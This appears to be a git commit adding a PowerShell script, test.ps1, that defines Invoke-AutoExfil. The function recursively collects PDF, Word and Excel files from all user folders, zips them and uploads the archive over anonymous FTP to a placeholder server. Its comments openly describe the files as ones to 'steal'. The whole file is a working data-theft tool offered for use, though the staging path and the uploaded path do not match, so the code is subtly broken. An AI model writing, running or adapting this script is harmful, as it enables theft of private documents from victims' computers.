1458583d8b73c86561973c06e6ebd99c82a5d241
yaboygmoney <goldstein.austin@gmail.com>
2020-09-03 11:59:25 -0500

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,21 @@
+function Invoke-AutoExfil
+{
+    $steal = ".pdf", ".doc", ".docx", ".xls" #Define what file types you want to steal
+    $destPath = "C:\Users\Public\Exfil.zip" #Define where you want your files staged
+    $hostname=(hostname)
+
+    $files = Get-ChildItem -Force -Recurse -Path C:\users\ -ErrorAction SilentlyContinue | Where {$_.Extension -in $steal} | Select name,fullname
+    
+    if ($files.Length -ne 0) 
+    {
+        write-host $files.length
+        Compress-Archive -LiteralPath $files.FullName -DestinationPath C:\users\Public\leaving.zip
+
+    	$server = "ftp://SERVERIP/" #Define your server IP
+    	$webclient = New-Object System.Net.WebClient
+    	$webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous","anonymous")
+
+    	$uri = New-Object System.Uri($server+$hostname+"Exfil.zip")
+	    $webclient.UploadFile($uri, $destPath)
+   }
+}
